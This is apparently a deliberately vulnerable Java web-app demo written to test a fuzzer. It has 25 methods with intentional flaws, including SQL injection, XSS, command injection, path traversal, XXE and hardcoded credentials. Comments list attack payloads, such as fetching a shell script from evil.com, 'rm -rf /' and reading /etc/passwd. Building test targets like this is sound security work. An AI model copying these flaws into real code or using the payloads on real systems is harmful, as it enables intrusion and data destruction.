package org.example;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.*;
import java.sql.*;

/**
 * Demo application with INTENTIONAL security vulnerabilities
 * Location: src/main/java/org/example/VulnerableWebApp.java
 * 
 * ⚠️ WARNING: This code contains security vulnerabilities on purpose
 * for testing the fuzzer. DO NOT use in production!
 */
public class VulnerableWebApp {
    
    // ============ SQL INJECTION VULNERABILITIES ============
    
    /**
     * VULN 1: Classic SQL Injection via string concatenation
     */
    public void authenticateUser(String username, String password) {
        // VULNERABLE: Direct string concatenation
        String sql = "SELECT * FROM users WHERE username = '" + username + 
                     "' AND password = '" + password + "'";
        
        System.out.println("Executing SQL: " + sql);
        
        // Attacker can use: username = "admin'--" to bypass authentication
        // Or: username = "' OR '1'='1" to dump all users
    }
    
    /**
     * VULN 2: SQL Injection in search functionality
     */
    public void searchProducts(String keyword) {
        String sql = "SELECT * FROM products WHERE name LIKE '%" + keyword + "%'";
        System.out.println("Search SQL: " + sql);
        
        // Attacker payload: keyword = "%' UNION SELECT password FROM users--"
    }
    
    /**
     * VULN 3: SQL Injection with ORDER BY clause
     */
    public void sortUsers(String sortColumn) {
        // Even ORDER BY can be dangerous!
        String sql = "SELECT * FROM users ORDER BY " + sortColumn;
        System.out.println("Sort SQL: " + sql);
        
        // Payload: sortColumn = "(CASE WHEN (1=1) THEN 1 ELSE 2 END)"
    }
    
    // ============ XSS (CROSS-SITE SCRIPTING) ============
    
    /**
     * VULN 4: Reflected XSS - No output encoding
     */
    public void displayUserComment(String comment) {
        System.out.println("<html><body>");
        System.out.println("<h1>User Comment</h1>");
        System.out.println("<p>" + comment + "</p>"); // VULNERABLE!
        System.out.println("</body></html>");
        
        // Payload: <script>alert('XSS')</script>
        // Or: <img src=x onerror=alert(document.cookie)>
    }
    
    /**
     * VULN 5: Stored XSS in profile page
     */
    public void renderUserProfile(String bio) {
        String html = "<div class='profile'>" +
                      "<h2>About Me</h2>" +
                      "<div>" + bio + "</div>" + // VULNERABLE!
                      "</div>";
        
        System.out.println(html);
    }
    
    /**
     * VULN 6: XSS in JavaScript context
     */
    public void generateJavaScript(String userName) {
        String js = "<script>" +
                    "var currentUser = '" + userName + "';" + // VULNERABLE!
                    "alert('Welcome ' + currentUser);" +
                    "</script>";
        
        System.out.println(js);
        
        // Payload: '; alert(document.cookie); var dummy='
    }
    
    // ============ PATH TRAVERSAL ============
    
    /**
     * VULN 7: Classic Path Traversal
     */
    public void downloadFile(String filename) {
        String basePath = "/var/www/uploads/";
        String fullPath = basePath + filename; // VULNERABLE!
        
        System.out.println("Reading file: " + fullPath);
        
        // Payload: ../../../etc/passwd
        // Or: ..\..\..\..\windows\system32\config\sam
    }
    
    /**
     * VULN 8: Path Traversal with weak validation
     */
    public void loadTemplate(String templateName) {
        // Weak check - can be bypassed
        if (!templateName.contains("..")) {
            String path = "/templates/" + templateName;
            System.out.println("Loading: " + path);
        }
        
        // Bypass: ....//....// or ..%2f..%2f
    }
    
    /**
     * VULN 9: Path Traversal in file upload
     */
    public void saveUploadedFile(String userFilename, byte[] data) {
        String uploadDir = "C:\\uploads\\";
        File file = new File(uploadDir + userFilename); // VULNERABLE!
        
        System.out.println("Saving to: " + file.getAbsolutePath());
        
        // Payload: ..\\..\\..\\windows\\system32\\malware.exe
    }
    
    // ============ COMMAND INJECTION ============
    
    /**
     * VULN 10: Command Injection via Runtime.exec()
     */
    public void pingHost(String hostname) {
        try {
            String command = "ping -c 4 " + hostname; // VULNERABLE!
            System.out.println("Executing: " + command);
            Runtime.getRuntime().exec(command);
        } catch (IOException e) {
            e.printStackTrace();
        }
        
        // Payload: 8.8.8.8; cat /etc/passwd
        // Or: 8.8.8.8 && wget http://evil.com/shell.sh
    }
    
    /**
     * VULN 11: Command Injection in system tools
     */
    public void convertImage(String inputFile) {
        try {
            String cmd = "convert " + inputFile + " output.jpg"; // VULNERABLE!
            Runtime.getRuntime().exec(cmd);
        } catch (IOException e) {
            e.printStackTrace();
        }
        
        // Payload: image.png; rm -rf /
    }
    
    /**
     * VULN 12: Command Injection via ProcessBuilder (still vulnerable!)
     */
    public void backupDatabase(String dbName) {
        try {
            // Still vulnerable if not properly validated
            ProcessBuilder pb = new ProcessBuilder(
                "mysqldump", 
                "-u", "root", 
                dbName // VULNERABLE if contains special chars!
            );
            pb.start();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    
    // ============ XXE (XML EXTERNAL ENTITY) ============
    
    /**
     * VULN 13: XXE vulnerability in XML parsing
     */
    public void parseXML(String xmlContent) {
        System.out.println("Parsing XML: " + xmlContent);
        
        // If xmlContent contains:
        // <?xml version="1.0"?>
        // <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
        // <data>&xxe;</data>
        // It can read sensitive files!
    }
    
    // ============ SSRF (SERVER-SIDE REQUEST FORGERY) ============
    
    /**
     * VULN 14: SSRF via URL fetching
     */
    public void fetchRemoteContent(String url) {
        System.out.println("Fetching content from: " + url);
        
        // Payload: http://localhost:8080/admin
        // Or: http://169.254.169.254/latest/meta-data/ (AWS metadata)
    }
    
    /**
     * VULN 15: SSRF in webhook
     */
    public void triggerWebhook(String webhookUrl) {
        System.out.println("Calling webhook: " + webhookUrl);
        
        // Payload: http://internal-server/secret-endpoint
    }
    
    // ============ INSECURE DESERIALIZATION ============
    
    /**
     * VULN 16: Insecure deserialization
     */
    public void deserializeUserSession(byte[] sessionData) {
        try {
            ByteArrayInputStream bis = new ByteArrayInputStream(sessionData);
            ObjectInputStream ois = new ObjectInputStream(bis);
            Object session = ois.readObject(); // VULNERABLE!
            System.out.println("Loaded session: " + session);
        } catch (Exception e) {
            e.printStackTrace();
        }
        
        // Attacker can craft malicious serialized objects
        // to execute arbitrary code
    }
    
    // ============ LDAP INJECTION ============
    
    /**
     * VULN 17: LDAP Injection
     */
    public void searchLDAP(String username) {
        String filter = "(uid=" + username + ")"; // VULNERABLE!
        System.out.println("LDAP filter: " + filter);
        
        // Payload: *)(uid=*))(|(uid=*
    }
    
    // ============ OPEN REDIRECT ============
    
    /**
     * VULN 18: Open Redirect
     */
    public void redirectUser(String targetUrl) {
        System.out.println("Redirecting to: " + targetUrl);
        // No validation of URL!
        
        // Payload: http://evil.com/phishing
    }
    
    // ============ INFORMATION DISCLOSURE ============
    
    /**
     * VULN 19: Stack trace exposure
     */
    public void processRequest(String input) {
        try {
            int value = Integer.parseInt(input);
            int result = 100 / value;
        } catch (Exception e) {
            // VULNERABLE: Exposing full stack trace
            System.out.println("Error: " + e.getMessage());
            e.printStackTrace();
        }
    }
    
    /**
     * VULN 20: Hardcoded credentials
     */
    public void connectDatabase() {
        String dbUrl = "jdbc:mysql://localhost:3306/mydb";
        String username = "admin";
        String password = "P@ssw0rd123"; // VULNERABLE: Hardcoded!
        
        System.out.println("Connecting with: " + username + "/" + password);
    }
    
    // ============ INSECURE CRYPTO ============
    
    /**
     * VULN 21: Weak encryption
     */
    public void encryptPassword(String password) {
        // Using weak/obsolete algorithm
        String encrypted = password; // Base64 is NOT encryption!
        System.out.println("Encrypted: " + 
            java.util.Base64.getEncoder().encodeToString(encrypted.getBytes()));
    }
    
    /**
     * VULN 22: Predictable random numbers
     */
    public void generateSessionToken() {
        // Weak PRNG
        java.util.Random rand = new java.util.Random(); // VULNERABLE!
        String token = String.valueOf(rand.nextInt());
        System.out.println("Token: " + token);
        
        // Should use SecureRandom instead
    }
    
    // ============ RACE CONDITION ============
    
    /**
     * VULN 23: Race condition in file operations
     */
    public void processFile(String filename) {
        File file = new File(filename);
        
        // VULNERABLE: Time-of-check to time-of-use (TOCTOU)
        if (file.exists()) {
            // File could be modified here by attacker!
            System.out.println("Processing: " + filename);
        }
    }
    
    // ============ UNVALIDATED REDIRECT ============
    
    /**
     * VULN 24: Unvalidated forward
     */
    public void forwardRequest(HttpServletRequest request, String page) {
        // No validation of page parameter
        System.out.println("Forwarding to: " + page);
        
        // Payload: /admin/deleteAllUsers
    }
    
    // ============ MASS ASSIGNMENT ============
    
    /**
     * VULN 25: Mass assignment vulnerability
     */
    public void updateUser(String[] params) {
        // Directly using user input to update objects
        System.out.println("Updating fields: " + String.join(", ", params));
        
        // Attacker can set: isAdmin=true, role=ADMIN
    }
}